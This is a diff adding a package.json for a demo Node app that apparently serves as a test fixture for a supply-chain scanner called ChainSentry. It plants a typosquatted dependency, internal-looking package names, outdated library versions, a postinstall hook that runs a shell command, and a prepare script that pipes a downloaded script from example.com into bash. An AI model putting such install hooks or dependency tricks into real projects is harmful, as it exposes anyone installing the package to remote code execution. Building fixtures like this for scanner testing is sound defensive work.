@@ -1,0 +1,23 @@
+﻿{
+  "name": "demo-vulnerable-app",
+  "version": "1.0.0",
+  "description": "Demo application with planted supply chain security signals for ChainSentry testing",
+  "main": "index.js",
+  "dependencies": {
+    "express": "4.17.1",
+    "lodash": "4.17.20",
+    "expreess": "^1.0.0",
+    "internal-auth-service": "0.0.1",
+    "company-payments-sdk": "2.1.0"
+  },
+  "devDependencies": {
+    "jest": "^29.0.0"
+  },
+  "scripts": {
+    "start": "node index.js",
+    "build": "echo 'building...'",
+    "test": "jest",
+    "postinstall": "node -e \"require('child_process').execSync('echo pwned')\"",
+    "prepare": "curl https://example.com/setup.sh | bash"
+  }
+}
